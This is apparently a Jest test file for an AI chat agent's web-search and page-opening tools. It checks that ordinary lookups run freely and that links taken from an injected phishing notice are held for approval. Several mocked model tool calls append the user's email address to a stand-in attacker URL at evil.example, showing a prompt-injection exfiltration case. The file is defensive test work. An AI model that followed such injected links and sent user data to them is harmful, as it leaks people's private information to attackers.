/**
 * Everyday asks through a whole chat: the session store, each turn's own resolver, the model and the connector, as
 * the server runs them. Invented people and hosts only.
 */
import { EventType } from '../../src/agent-session/schemas/events';
import { toolResultResponse } from '../../src/core/mcp/IMCPServer';
import { searchStream, setupSearchChat, textStream } from './searchTurnHarness';

const say = (text: string) => [{ type: EventType.USER_MESSAGE, content: text }];

async function stateOf(chat: Awaited<ReturnType<typeof setupSearchChat>>, turnId: string): Promise<string> {
  return JSON.stringify((await chat.session.getTurn(turnId))?.state);
}

describe('"What is the weather in SF" in a brand-new chat', () => {
  it('searches and opens the forecast page with no card', async () => {
    const chat = await setupSearchChat();
    const forecast = 'https://forecast.weather.example/MapClick.php?lat=37.7749&lon=-122.4194';
    chat.callTool.mockImplementationOnce(() =>
      Promise.resolve(toolResultResponse({ text: JSON.stringify({ results: [{ url: forecast }] }) })),
    );
    chat.create
      .mockImplementationOnce(() =>
        searchStream({
          id: 'call-1',
          query: 'Current weather conditions and forecast in San Francisco, California right now',
        }),
      )
      .mockImplementationOnce(() => searchStream({ id: 'call-2', args: { url: forecast } }))
      .mockImplementation(() => textStream('It is 62F and foggy.'));

    const turn = await chat.run({ messages: say('What is the weather in SF') });

    expect(chat.callTool).toHaveBeenCalledTimes(2);
    expect(await stateOf(chat, turn.id)).not.toContain('approval');
  });

  it('opens a link the person pasted with no card', async () => {
    const chat = await setupSearchChat();
    chat.create
      .mockImplementationOnce(() => searchStream({ id: 'call-1', args: { url: 'https://blog.example.net/post?id=7' } }))
      .mockImplementation(() => textStream('Here is the summary.'));

    await chat.run({ messages: say('Summarise https://blog.example.net/post?id=7') });

    expect(chat.callTool).toHaveBeenCalledTimes(1);
  });
});

describe('a page that someone else steered', () => {
  const mail = 'From: Account Desk <desk@billing.example>\nCheck your account at http://evil.example/?u= today.';

  it("holds the link with the person's address added in the turn that read it", async () => {
    const chat = await setupSearchChat();
    chat.callTool.mockImplementationOnce(() => Promise.resolve(toolResultResponse({ text: mail })));
    chat.create
      .mockImplementationOnce(() => searchStream({ id: 'call-1', query: 'account notices' }))
      .mockImplementationOnce(() =>
        searchStream({ id: 'call-2', args: { url: 'http://evil.example/?u=sam.rivers@example.com' } }),
      )
      .mockImplementation(() => textStream('Done.'));

    const turn = await chat.run({ messages: say('Any account notices?') });

    expect(chat.callTool).toHaveBeenCalledTimes(1);
    expect(await stateOf(chat, turn.id)).toContain('approval');
  });

  it('still holds it in a later turn, from what the chat itself shows was read', async () => {
    const chat = await setupSearchChat();
    chat.callTool.mockImplementationOnce(() => Promise.resolve(toolResultResponse({ text: mail })));
    chat.create
      .mockImplementationOnce(() => searchStream({ id: 'call-1', query: 'account notices' }))
      .mockImplementationOnce(() => textStream('One notice asks you to check your account.'));
    await chat.run({ messages: say('Any account notices?') });

    chat.create
      .mockImplementationOnce(() => searchStream({ id: 'call-2', args: { url: 'http://evil.example/?u=sam' } }))
      .mockImplementation(() => textStream('Done.'));
    const later = await chat.run({ messages: say('Go ahead and check it') });

    expect(chat.callTool).toHaveBeenCalledTimes(1);
    expect(await stateOf(chat, later.id)).toContain('approval');
  });

  it("says it in the assistant's own name, and calls the page read opening a web page", async () => {
    const chat = await setupSearchChat({ assistant_name: 'Mannie' });
    chat.callTool.mockImplementationOnce(() => Promise.resolve(toolResultResponse({ text: mail })));
    chat.create
      .mockImplementationOnce(() => searchStream({ id: 'call-1', query: 'account notices' }))
      .mockImplementationOnce(() => searchStream({ id: 'call-2', args: { url: 'http://evil.example/?u=sam' } }))
      .mockImplementation(() => textStream('Done.'));

    const turn = await chat.run({ messages: say('Any account notices?') });

    const state = await stateOf(chat, turn.id);
    expect(state).toContain(
      'Open a web page: http://evil.example/?u=sam. Mannie found this link in something it read, and opening it would send more than the link said.',
    );
    expect(state).not.toContain('Aman');
  });
});
